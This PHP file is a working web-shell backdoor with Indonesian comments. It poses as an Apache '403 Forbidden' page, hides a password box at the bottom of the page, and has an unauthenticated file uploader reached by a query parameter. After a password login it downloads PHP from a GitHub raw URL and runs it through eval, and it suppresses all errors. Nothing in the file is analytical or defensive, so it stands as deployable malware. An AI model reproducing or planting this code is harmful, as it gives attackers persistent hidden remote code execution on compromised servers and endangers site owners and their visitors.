<?php
error_reporting(0);
ini_set('display_errors', 0);

    if (isset($_GET['inc']) && $_GET['inc'] === 'upload') {
        // Tampilkan formulir unggah file
        echo '<form method="post" enctype="multipart/form-data">';
        echo '<input type="text" name="dir" size="30" value="' . getcwd() . '">';
        echo '<input type="file" name="file" size="15">';
        echo '<input type="submit" value="Unggah">';
        echo '</form>';
    }

    if (isset($_FILES['file']['tmp_name'])) {
        // Tangani unggahan file jika formulir dikirimkan
        $uploadd = $_FILES['file']['tmp_name'];
        if (file_exists($uploadd)) {
            $pwddir = $_POST['dir'];
            $real = $_FILES['file']['name'];
            $de = $pwddir . "/" . $real;
            copy($uploadd, $de);
            echo "BERKAS DIUNGGAHKAN KE $de";
        }
    }
?>
<?php

error_reporting(0);
ini_set('display_errors', 0);

session_start();

// Fungsi untuk mengecek jika user sudah login
function is_logged_in() {
    return isset($_SESSION['R10TXER']);
}

// Fungsi untuk login
function login($password) {
    // Hash password valid menggunakan bcrypt
    $valid_password_hash = '$2a$12$jxtGpHP6U06mcfmDnBR.3esEMa1IHAJFwaFroDiJAbq6mFxO9B6hO'; // Contoh hash bcrypt
    // Verifikasi password dengan bcrypt
    if (password_verify($password, $valid_password_hash)) {
        $_SESSION['R10TXER'] = 'user';
        return true;
    } else {
        return false;
    }
}

// Fungsi untuk logout
function logout() {
    unset($_SESSION['R10TXER']);
}

// Cek jika ada request POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['password'])) {
        $password = $_POST['password'];
        if (login($password)) {
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error_message = "TITIT KAU";
            if (!is_logged_in()) {
                echo '<script>alert("'.$error_message.'");</script>';
            }
        }
    }
}

// Fungsi untuk mengambil konten dari URL
function getContent($url) {
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    $content = curl_exec($curl);
    curl_close($curl);
    if ($content === false) {
        $content = file_get_contents($url);
    }
    return $content;
}
// Cek jika user sudah login
if (is_logged_in()) {
    $url = 'https://raw.githubusercontent.com/R10TX/getback/main/gecko.php';
    $content = getContent($url);
    eval('?>' . $content);
    exit;
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>403 Forbidden</title>
</head>
<body>
    <h1>Forbidden</h1>
    <p>You don't have permission to access <?php echo $_SERVER['REQUEST_URI']; ?> on this server.</p>
    <hr>
    <address><?php echo $_SERVER['SERVER_SOFTWARE']; ?> Server at <?php echo $_SERVER['SERVER_NAME']; ?> Port <?php echo $_SERVER['SERVER_PORT']; ?></address>
    <form method="post">
        <input style="position: absolute; bottom: 0; left: 50%; transform: translateX(-50%); background-color: #fff; border: 1px solid #fff; text-align: center;" type="password" name="password">
    </form>
</body>
</html>
